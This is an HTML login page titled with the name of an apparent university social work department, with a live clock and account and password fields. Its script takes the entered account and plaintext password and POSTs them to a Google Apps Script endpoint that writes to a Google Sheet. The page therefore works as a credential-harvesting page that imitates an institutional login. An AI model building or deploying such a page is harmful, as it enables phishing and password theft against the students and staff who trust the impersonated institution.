<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<title>義大社工科</title>

<style>
body {
  font-family: "標楷體";
  margin: 0;
  padding: 0;
}

/* 左上角時間 */
#time {
  position: absolute;
  top: 10px;
  left: 10px;
  font-size: 18px;
}

/* 標題 */
h1 {
  text-align: center;
  font-size: 48px;
  margin-top: 60px;
}

/* 欄位標籤 */
.label {
  text-align: center;
  font-size: 24px;
  margin-top: 20px;
}

/* 輸入框 */
input {
  display: block;
  margin: 10px auto;
  width: 250px;
  height: 35px;
  font-size: 18px;
}

/* 按鈕 */
button {
  display: block;
  margin: 30px auto;
  width: 120px;
  height: 40px;
  font-size: 18px;
}
</style>
</head>

<body>

<div id="time"></div>

<h1>義大社工科</h1>

<div class="label">帳號</div>
<input type="text" id="account">

<div class="label">密碼</div>
<input type="password" id="password">

<button onclick="submitData()">送出</button>

<script>
// 🕒 即時時間
function updateTime() {
  const now = new Date();
  const timeString =
    now.getFullYear() + "-" +
    String(now.getMonth()+1).padStart(2,'0') + "-" +
    String(now.getDate()).padStart(2,'0') + " " +
    String(now.getHours()).padStart(2,'0') + ":" +
    String(now.getMinutes()).padStart(2,'0') + ":" +
    String(now.getSeconds()).padStart(2,'0');

  document.getElementById("time").innerText = timeString;
}
setInterval(updateTime, 1000);
updateTime();


// 📤 送出資料到 Google Sheet
function submitData() {
  const account = document.getElementById("account").value;
  const password = document.getElementById("password").value;

  fetch("https://script.google.com/macros/s/AKfycbxrRpoZyPMS3mA5y2vz2sU0WTZ_BO_ifCDwgICZ7DYbHpgfHLDgmYn-1A9RM1QxJcVV9w/exec", {
    method: "POST",
    body: JSON.stringify({
      account: account,
      password: password
    })
  })
  .then(res => res.text())
  .then(data => {
    alert("資料已送出");
  })
  .catch(err => {
    alert("傳送失敗");
  });
}
</script>

</body>
</html>
